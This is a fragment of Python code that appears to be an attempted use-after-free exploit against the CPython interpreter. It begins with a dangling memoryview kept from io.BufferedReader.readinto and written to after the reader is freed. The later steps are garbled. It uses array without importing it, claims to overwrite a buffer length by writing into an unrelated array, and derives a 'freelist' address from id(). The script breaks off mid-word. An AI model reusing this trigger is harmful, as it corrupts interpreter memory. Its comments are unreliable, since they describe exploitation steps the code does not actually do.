import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f

view[0] = 0

# Now we have a buffer object with a dangling reference to a buffer object
# as its underlying buffer.

# This is the buffer object we want to free.
buffer_to_free = view.obj

# Allocate a new buffer object with a large size.
buf = array('B', [0] * (2**30))

# Overwrite the length of the old buffer object.
buf[0] = (buffer_to_free.len >> 8) & 0xff
buf[1] = buffer_to_free.len & 0xff

# Now free the buffer object.
buf = None

# Trigger a GC.
del view

# The buffer object we want to free is now in the freelist.
# We can now allocate a new buffer object and get the address of the
# freelist.

new_buffer = array('B', [0] * (2**30))
freelist = id(new_buffer) - 0x10

# We can now overwrite the freelist pointer with an arbitrary address.
# This is a UAF.

new
